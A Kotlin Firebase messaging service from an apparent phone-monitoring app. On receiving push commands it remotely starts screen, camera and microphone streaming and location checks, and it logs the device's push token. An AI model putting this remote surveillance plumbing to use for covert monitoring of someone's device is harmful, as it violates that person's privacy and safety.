package com.spapp.monitoring.fcm

import android.util.Log
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import com.spapp.monitoring.data.DeviceState
import com.spapp.monitoring.sync.SyncRunner
import com.spapp.monitoring.sync.SyncScheduler
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.runBlocking
import kotlinx.coroutines.withTimeoutOrNull

/**
 * Receives FCM push messages — delivers near-instant response for "Check Location Now",
 * remote lock, and on-demand commands.
 *
 * FirebaseMessagingService already executes on an OS-managed background worker thread
 * and holds a WakeLock while onMessageReceived runs.
 * We immediately execute SyncRunner.runFastCommandPass() right here so the location check
 * completes in 1-3 seconds instead of waiting for WorkManager/JobScheduler delays.
 */
class SpappFirebaseMessagingService : FirebaseMessagingService() {

    companion object {
        private const val TAG = "SpappFcmService"
    }

    override fun onNewToken(token: String) {
        super.onNewToken(token)
        Log.d(TAG, "New FCM token received: $token")
        FcmTokenSync.enqueueUpload(applicationContext, token)
    }

    override fun onMessageReceived(message: RemoteMessage) {
        super.onMessageReceived(message)
        Log.d(TAG, "FCM message received: data=${message.data}")

        val authToken = DeviceState(applicationContext).authToken
        if (authToken.isNullOrEmpty()) {
            Log.w(TAG, "Device not activated yet — ignoring FCM push")
            return
        }

        // Fast path: if this is a screen stream command, start streaming immediately without waiting for HTTP polling
        if (message.data["commandType"] == "screen_stream") {
            val deviceId = DeviceState(applicationContext).getEffectiveDeviceId()
            if (deviceId != null && com.spapp.monitoring.blocking.BlockAccessibilityService.instance != null) {
                Log.d(TAG, "FCM fast-path: triggering screen stream immediately")
                com.spapp.monitoring.screenstream.ScreenStreamService.start(applicationContext)
            }
        }

        // Fast path: if this is a camera stream command, start streaming immediately
        if (message.data["commandType"] == "camera_stream") {
            val hasCameraPermission = androidx.core.content.ContextCompat.checkSelfPermission(
                applicationContext,
                android.Manifest.permission.CAMERA
            ) == android.content.pm.PackageManager.PERMISSION_GRANTED
            if (hasCameraPermission) {
                Log.d(TAG, "FCM fast-path: triggering camera stream immediately")
                com.spapp.monitoring.camerastream.CameraStreamService.start(applicationContext, "back")
            }
        }

        // Fast path: if this is an audio stream command, start streaming immediately
        if (message.data["commandType"] == "audio_stream") {
            val hasAudioPermission = androidx.core.content.ContextCompat.checkSelfPermission(
                applicationContext,
                android.Manifest.permission.RECORD_AUDIO
            ) == android.content.pm.PackageManager.PERMISSION_GRANTED
            if (hasAudioPermission) {
                Log.d(TAG, "FCM fast-path: triggering audio stream immediately")
                com.spapp.monitoring.audiostream.AudioStreamService.start(applicationContext)
            }
        }

        // Execute fast command pass IMMEDIATELY.
        // runBlocking holds the Firebase WakeLock and prevents the OS from putting the process
        // to sleep before the location is fetched and POSTed to the backend.
        try {
            runBlocking(Dispatchers.IO) {
                withTimeoutOrNull(15_000L) {
                    val runner = SyncRunner(applicationContext)
                    val result = runner.runFastCommandPass()
                    Log.d(TAG, "Immediate command pass finished: result=$result")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error executing fast command pass from FCM", e)
        }

        // Also schedule a regular background sync pass via WorkManager to handle routine syncs
        SyncScheduler.runOnce(applicationContext)
    }
}
